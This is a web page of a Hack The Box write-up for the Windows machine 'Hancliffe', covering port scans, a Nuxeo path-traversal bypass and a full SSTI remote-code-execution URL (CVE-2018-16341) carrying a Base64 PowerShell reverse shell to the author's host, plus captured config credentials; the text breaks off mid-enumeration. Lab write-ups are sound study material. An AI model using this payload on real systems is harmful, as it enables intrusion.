<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>

<meta charset="utf-8">
<meta name="generator" content="quarto-1.5.45">

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">

<meta name="author" content="0xPThree">
<meta name="dcterms.date" content="2022-01-24">
<meta name="description" content="Hancliffe is an hard-rated Windows machine from Hack The Box, and holy fuck is it hard! This is definitely one of the most challenging machines I’ve done, if not THE most challenging, and also most fun. There’s a lot going on here, SSTI, Parser Logic, Firefox Profiles but in the end it’s the reversing and binary exploitation parts that shine. I encountered my first ghidra disasembly error throwing me off guard for literally days. I’ve learned a lot throughout this machine and this is one of my most thorough writeups, so I hope it helps and that you learn aswell! :)">

<title>Hancliffe - Hack The Box</title>
<style>
code{white-space: pre-wrap;}
span.smallcaps{font-variant: small-caps;}
div.columns{display: flex; gap: min(4vw, 1.5em);}
div.column{flex: auto; overflow-x: auto;}
div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
ul.task-list{list-style: none;}
ul.task-list li input[type="checkbox"] {
  width: 0.8em;
  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
  vertical-align: middle;
}
/* CSS for syntax highlighting */
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
</style>


<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
<script src="../../site_libs/clipboard/clipboard.min.js"></script>
<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
<script src="../../site_libs/quarto-search/fuse.min.js"></script>
<script src="../../site_libs/quarto-search/quarto-search.js"></script>
<meta name="quarto:offset" content="../../">
<link href="../../favicon.ico" rel="icon">
<script src="../../site_libs/quarto-html/quarto.js"></script>
<script src="../../site_libs/quarto-html/popper.min.js"></script>
<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
<script src="../../site_libs/quarto-html/anchor.min.js"></script>
<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
<link href="../../site_libs/quarto-html/quarto-syntax-highlighting.css" rel="stylesheet" id="quarto-text-highlighting-styles">
<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
<link href="../../site_libs/bootstrap/bootstrap.min.css" rel="stylesheet" id="quarto-bootstrap" data-mode="light">
<script id="quarto-search-options" type="application/json">{
  "location": "navbar",
  "copy-button": false,
  "collapse-after": 3,
  "panel-placement": "end",
  "type": "overlay",
  "limit": 50,
  "keyboard-shortcut": [
    "f",
    "/",
    "s"
  ],
  "show-item-context": false,
  "language": {
    "search-no-results-text": "No results",
    "search-matching-documents-text": "matching documents",
    "search-copy-link-title": "Copy link to search",
    "search-hide-matches-text": "Hide additional matches",
    "search-more-match-text": "more match in this document",
    "search-more-matches-text": "more matches in this document",
    "search-clear-button-title": "Clear",
    "search-text-placeholder": "",
    "search-detached-cancel-button-title": "Cancel",
    "search-submit-button-title": "Submit",
    "search-label": "Search"
  }
}</script>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>

<script type="text/javascript">

window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
</script>


<link rel="stylesheet" href="../../scss/styles.css">
<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
</head>

<body class="nav-fixed">

<div id="quarto-search-results"></div>
  <header id="quarto-header" class="headroom fixed-top quarto-banner">
    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
      <div class="navbar-container container-fluid">
      <div class="navbar-brand-container mx-auto">
    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
    </a>
  </div>
            <div id="quarto-search" class="" title="Search"></div>
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
  <span class="navbar-toggler-icon"></span>
</button>
          <div class="collapse navbar-collapse" id="navbarCollapse">
            <ul class="navbar-nav navbar-nav-scroll ms-auto">
  <li class="nav-item">
    <a class="nav-link" href="../../index.html"> 
<span class="menu-text">Home</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
<span class="menu-text">Notes</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="../../about.html"> 
<span class="menu-text">About</span></a>
  </li>  
</ul>
          </div> <!-- /navcollapse -->
            <div class="quarto-navbar-tools">
</div>
      </div> <!-- /container-fluid -->
    </nav>
</header>
<!-- content -->
<header id="title-block-header" class="quarto-title-block default page-columns page-full">
  <div class="quarto-title-banner page-columns page-full">
    <div class="quarto-title column-body">
      <h1 class="title">Hancliffe - Hack The Box</h1>
                  <div>
        <div class="description">
          Hancliffe is an hard-rated Windows machine from Hack The Box, and holy fuck is it hard! This is definitely one of the most challenging machines I’ve done, if not THE most challenging, and also most fun. There’s a lot going on here, SSTI, Parser Logic, Firefox Profiles but in the end it’s the reversing and binary exploitation parts that shine. I encountered my first ghidra disasembly error throwing me off guard for literally days. I’ve learned a lot throughout this machine and this is one of my most thorough writeups, so I hope it helps and that you learn aswell! :)
        </div>
      </div>
                          <div class="quarto-categories">
                <div class="quarto-category">hackthebox</div>
                <div class="quarto-category">windows</div>
                <div class="quarto-category">ssti</div>
                <div class="quarto-category">ngnix</div>
                <div class="quarto-category">firefox</div>
                <div class="quarto-category">buffer overflow</div>
                <div class="quarto-category">socket reuse</div>
                <div class="quarto-category">aslr</div>
              </div>
                  </div>
  </div>
    
  
  <div class="quarto-title-meta">

      <div>
      <div class="quarto-title-meta-heading">Author</div>
      <div class="quarto-title-meta-contents">
               <p>0xPThree </p>
            </div>
    </div>
      
      <div>
      <div class="quarto-title-meta-heading">Published</div>
      <div class="quarto-title-meta-contents">
        <p class="date">January 24, 2022</p>
      </div>
    </div>
    
      
    </div>
    
  
  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
<!-- sidebar -->
<!-- margin-sidebar -->
    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
        <nav id="TOC" role="doc-toc" class="toc-active">
    <h2 id="toc-title">On this page</h2>
   
  <ul>
  <li><a href="#user" id="toc-user" class="nav-link active" data-scroll-target="#user">USER</a>
  <ul class="collapse">
  <li><a href="#step-1" id="toc-step-1" class="nav-link" data-scroll-target="#step-1">Step 1</a></li>
  <li><a href="#step-2" id="toc-step-2" class="nav-link" data-scroll-target="#step-2">Step 2</a></li>
  <li><a href="#step-3" id="toc-step-3" class="nav-link" data-scroll-target="#step-3">Step 3</a></li>
  <li><a href="#step-4" id="toc-step-4" class="nav-link" data-scroll-target="#step-4">Step 4</a></li>
  </ul></li>
  <li><a href="#root" id="toc-root" class="nav-link" data-scroll-target="#root">ROOT</a>
  <ul class="collapse">
  <li><a href="#step-1-1" id="toc-step-1-1" class="nav-link" data-scroll-target="#step-1-1">Step 1</a></li>
  <li><a href="#step-2-1" id="toc-step-2-1" class="nav-link" data-scroll-target="#step-2-1">Step 2</a></li>
  <li><a href="#step-3-1" id="toc-step-3-1" class="nav-link" data-scroll-target="#step-3-1">Step 3</a></li>
  <li><a href="#step-4-1" id="toc-step-4-1" class="nav-link" data-scroll-target="#step-4-1">Step 4</a></li>
  <li><a href="#step-5" id="toc-step-5" class="nav-link" data-scroll-target="#step-5">Step 5</a></li>
  </ul></li>
  <li><a href="#references" id="toc-references" class="nav-link" data-scroll-target="#references">References</a></li>
  </ul>
</nav>
    </div>
<!-- main -->
<main class="content quarto-banner-title-block" id="quarto-document-content">





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[~]</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> nmap <span class="at">-p-</span> 10.10.11.115        </span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>     STATE SERVICE</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span>   open  http</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">8000/tcp</span> open  http-alt</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">9999/tcp</span> open  abyss</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[~]</span></span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> nmap <span class="at">-p80,8000,9999</span> <span class="at">-sCV</span> 10.10.11.115</span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>     STATE SERVICE VERSION</span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span>   open  http    nginx 1.21.0</span>
<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> nginx/1.21.0</span>
<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Welcome to nginx!</span>
<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="ex">8000/tcp</span> open  http    nginx 1.21.0</span>
<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-open-proxy:</span> Proxy might be redirecting requests</span>
<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> nginx/1.21.0</span>
<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> HashPass <span class="kw">|</span> <span class="ex">Open</span> Source Stateless Password Manager</span>
<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="ex">9999/tcp</span> open  abyss<span class="pp">?</span></span>
<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">fingerprint-strings:</span> </span>
<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">DNSStatusRequestTCP,</span> FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe: </span>
<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="ex">Welcome</span> Brankas Application.</span>
<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="ex">Username:</span> Password:</span>
<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">NULL:</span> </span>
<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>     <span class="ex">Welcome</span> Brankas Application.</span>
<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>    Username:</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>dirb:</strong></p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span> 80:</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.115/con <span class="er">(</span><span class="ex">CODE:500</span><span class="kw">|</span><span class="ex">SIZE:494</span><span class="kw">)</span></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.115/index.html <span class="er">(</span><span class="ex">CODE:200</span><span class="kw">|</span><span class="ex">SIZE:612</span><span class="kw">)</span></span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.115/maintenance <span class="er">(</span><span class="ex">CODE:302</span><span class="kw">|</span><span class="ex">SIZE:0</span><span class="kw">)</span></span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.115/nul <span class="er">(</span><span class="ex">CODE:500</span><span class="kw">|</span><span class="ex">SIZE:494</span><span class="kw">)</span></span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span> 8000:</span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="ex">==</span><span class="op">&gt;</span> DIRECTORY: http://10.10.11.115:8000/assets/</span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.115:8000/con <span class="er">(</span><span class="ex">CODE:500</span><span class="kw">|</span><span class="ex">SIZE:579</span><span class="kw">)</span></span>
<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="ex">==</span><span class="op">&gt;</span> DIRECTORY: http://10.10.11.115:8000/includes/</span>
<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.115:8000/index.php <span class="er">(</span><span class="ex">CODE:200</span><span class="kw">|</span><span class="ex">SIZE:7880</span><span class="kw">)</span></span>
<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.115:8000/license <span class="er">(</span><span class="ex">CODE:200</span><span class="kw">|</span><span class="ex">SIZE:34501</span><span class="kw">)</span></span>
<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.115:8000/LICENSE <span class="er">(</span><span class="ex">CODE:200</span><span class="kw">|</span><span class="ex">SIZE:34501</span><span class="kw">)</span></span>
<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.115:8000/nul <span class="er">(</span><span class="ex">CODE:500</span><span class="kw">|</span><span class="ex">SIZE:579</span><span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>nikto:</strong></p>
<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span> 80:</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Server: nginx/1.21.0</span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> /maintenance/: Admin login page/section found.</span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span> 8000:</span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Server: nginx/1.21.0</span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Retrieved x-powered-by header: PHP/8.0.7</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>ffuf:</strong></p>
<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span> 80:</span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">maintenance</span>             [Status: 302, Size: 0, Words: 1, Lines: 1]</span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span> 8000:</span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="ex">N/A</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>port 9999</strong></p>
<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[~]</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> nc 10.10.11.115 9999</span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Welcome</span> Brankas Application.</span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Username:</span> anonymous</span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> anonymous</span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Username</span> or Password incorrect</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>PORT 80:</strong> - Visiting http://10.10.11.115/maintenance/ -&gt; 302 Moved /<strong>nuxeo</strong>/Maintenance/ - Which is probably <a href="https://github.com/nuxeo/nuxeo-web-ui">nuxeo web ui</a> but unable to fuzz the directory</p>
<p><strong>PORT 8000:</strong> - http://10.10.11.115:8000/ is used for <a href="https://github.com/scottparry/hashpass">HashPass</a></p>
<hr>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>From our inital checks we found that GET requests on port 80 to <code>/maintenance/</code> got 302 Moved to <code>/nuxeo/Maintenance</code>, which is interesting. Playing some more we find that ..</p>
<p>.. GET <code>/maintenance/..;/index.jsp</code> -&gt; 302 Moved <code>/nuxeo/nxstartup.faces</code><br> .. GET <code>/maintenance/..;/nuxeo/nxstartup.faces</code> -&gt; 302 Moved <code>/nuxeo/login.jsp</code><br> .. GET <code>/maintenance/..;/login.jsp</code> -&gt; <strong>200 Found</strong></p>
<p>We have a login prompt, but no credentials. A quick google and the second result we find is a <a href="https://github.com/mpgn/CVE-2018-16341">authentication bypass rce</a>, which leverages SSTI.</p>
<p>To see if the target is vulnerable to SSTI we can use this simple test string:</p>
<p><img src="images/hancliffe01.png" class="img-fluid"></p>
<p>Using <a href="https://revshells.com">revshell.com</a> we generate a PowerShell #3 (Base64) shell as payload and trigger full SSTI RCE:</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>http<span class="op">:</span><span class="co">//10.10.11.115/maintenance/..;/login.jsp/pwn$%7B%22%22.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAiACwANAA0ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=%22,null).waitFor()%7D.xhtml</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb7"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>┌──<span class="op">(</span>void㉿void<span class="op">)-[/</span>htb<span class="op">/</span>hancliffe<span class="op">]</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>└─$ rlwrap <span class="op">-</span>cAr nc <span class="op">-</span>lvnp <span class="dv">4488</span></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="dt">listening</span> on <span class="op">[</span>any<span class="op">]</span> <span class="dv">4488</span> <span class="op">...</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>connect to <span class="op">[</span><span class="dv">10.10.14.8</span><span class="op">]</span> <span class="kw">from</span> <span class="op">(</span>UNKNOWN<span class="op">)</span> <span class="op">[</span><span class="dv">10.10.11.115</span><span class="op">]</span> <span class="dv">57150</span></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="dt">PS</span> C<span class="op">:</span>\Nuxeo<span class="op">&gt;</span> whoami</span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>hancliffe\svc_account</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>Manually enumerating the machine and we find little to nothing.</p>
<p>.. some SMTP (default?) credentials:</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Nuxeo\conf\Catalina\localhost<span class="op">&gt;</span> <span class="fu">type</span> nuxeo<span class="op">.</span><span class="fu">xml</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="op">[...</span> snip <span class="op">...]</span></span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>Resource auth<span class="op">=</span><span class="st">"Container"</span> name<span class="op">=</span><span class="st">"Mail"</span> <span class="fu">type</span><span class="op">=</span><span class="st">"javax.mail.Session"</span> factory<span class="op">=</span><span class="st">"org.nuxeo.ecm.platform.ec.notification.email.EmailResourceFactory"</span></span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>    mail<span class="op">.</span><span class="fu">from</span><span class="op">=</span><span class="st">"noreply@nuxeo.com"</span></span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>    mail<span class="op">.</span><span class="fu">store</span><span class="op">.</span><span class="fu">protocol</span><span class="op">=</span><span class="st">"pop3"</span></span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>    mail<span class="op">.</span><span class="fu">pop3</span><span class="op">.</span><span class="fu">host</span><span class="op">=</span><span class="st">"localhost"</span></span>
<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>    mail<span class="op">.</span><span class="fu">pop3</span><span class="op">.</span><span class="fu">port</span><span class="op">=</span><span class="st">"110"</span></span>
<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>    mail<span class="op">.</span><span class="fu">pop3</span><span class="op">.</span><span class="fu">user</span><span class="op">=</span><span class="st">"anonymous"</span></span>
<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>    mail<span class="op">.</span><span class="fu">pop3</span><span class="op">.</span><span class="fu">password</span><span class="op">=</span><span class="st">"secret"</span></span>
<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>    mail<span class="op">.</span><span class="fu">transport</span><span class="op">.</span><span class="fu">protocol</span><span class="op">=</span><span class="st">"smtp"</span></span>
<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>    mail<span class="op">.</span><span class="fu">smtp</span><span class="op">.</span><span class="fu">host</span><span class="op">=</span><span class="st">"localhost"</span></span>
<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>    mail<span class="op">.</span><span class="fu">smtp</span><span class="op">.</span><span class="fu">port</span><span class="op">=</span><span class="st">"25"</span></span>
<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>  <span class="op">/&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>.. a few database variables:</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="fu">type</span> pg_env<span class="op">.</span><span class="fu">bat</span></span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>@ECHO OFF</span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>REM The script sets environment variables helpful <span class="cf">for</span> PostgreSQL</span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>@SET PATH<span class="op">=</span><span class="st">"C:\Program Files\PostgreSQL\9.6\bin"</span><span class="op">;%</span>PATH<span class="op">%</span></span>
